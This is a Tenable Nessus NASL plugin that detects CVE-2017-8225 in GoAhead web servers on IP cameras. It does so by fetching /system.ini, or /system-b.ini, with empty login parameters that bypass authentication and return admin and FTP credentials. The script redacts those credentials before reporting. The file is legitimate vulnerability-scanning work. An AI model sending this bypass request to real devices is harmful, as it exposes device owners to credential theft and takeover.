#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(102174);
  script_version("1.7");
  script_cvs_date("Date: 2019/11/12");

  script_cve_id("CVE-2017-8225");

  script_name(english:"GoAhead System.ini Leak");
  script_summary(english:"Extracts username and password from GoAhead server");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to an information leak that
could allow a remote attacker to learn the admin username and password");
  script_set_attribute(attribute:"description", value:
"The remote server uses a version of GoAhead that allows a remote
unauthenticated attacker to download the system.ini file. This file
contains credentials to the web interface, ftp interface, and others.");
  # http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-en/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ad0d0c84");
  script_set_attribute(attribute:"see_also", value:"https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt");
  script_set_attribute(attribute:"solution", value:
"If possible, update the device's firmware and ensure that the HTTP server is
not accessible via the internet.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:U/RC:X");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-8225");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/08/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/goahead");
  script_require_ports("Services/www", 80, 81, 82, 83);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:81, embedded:TRUE);
banner = get_http_banner(port:port);
if ("Server: GoAhead-Webs" >!< banner) audit(AUDIT_WRONG_WEB_SERVER, port, "GoAhead-Webs");

uri = '/system.ini';
res = http_send_recv3(
  method:"GET",
  item:uri,
  port:port,
  exit_on_fail:FALSE);

if (isnull(res) || "401" >!< res[0])
{
  # try system-b.ini
  uri = '/system-b.ini';
  res = http_send_recv3(
    method:"GET",
    item:uri,
    port:port,
    exit_on_fail:FALSE);

  if (isnull(res) || "401" >!< res[0])
  {
    audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
  }
}

# We've been blocked from the ini script. Bypass by
# providing empty creds.
uri += '?loginuse&loginpas&apos';
res = http_send_recv3(
  method:"GET",
  item:uri,
  port:port,
  exit_on_fail:FALSE);

if (isnull(res) || "200" >!< res[0] || len(res[2]) == 0)
{
  audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
}

# We have a response with a payload. We can verify
# the payload by looking for some magic bytes that
# we know exist in the file.
if (isnull(strstr(res[2], '\x0a\x0a\x0a\x0a\x01')))
{
  audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
}

res[2] = data_protection::sanitize_user_full_redaction(output:res[2]);

security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  file: uri,
  request: make_list(build_url(qs:uri, port:port)),
  output: chomp(res[2]),
  attach_type: 'text/plain'
);
